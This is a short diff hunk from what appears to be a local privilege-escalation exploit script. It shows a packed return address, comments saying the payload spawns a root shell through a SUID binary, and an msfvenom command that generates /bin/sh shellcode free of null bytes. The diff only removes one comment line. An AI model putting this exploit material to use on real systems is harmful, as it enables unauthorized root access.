@@ -312,7 +312,6 @@ return_addr = struct.pack("<I", 0xbffffb04)
 # =========================================================
 # 2. PAYLOAD (Shellcode)
 # =========================================================
-# This shellcode executes: setreuid(0,0) + execve("/bin/sh")
 # When the binary has the SUID bit this allows us to become root
 # msfvenom -p linux/x86/exec -f python CMD="/bin/sh" -b '\x00'
 shellcode = (
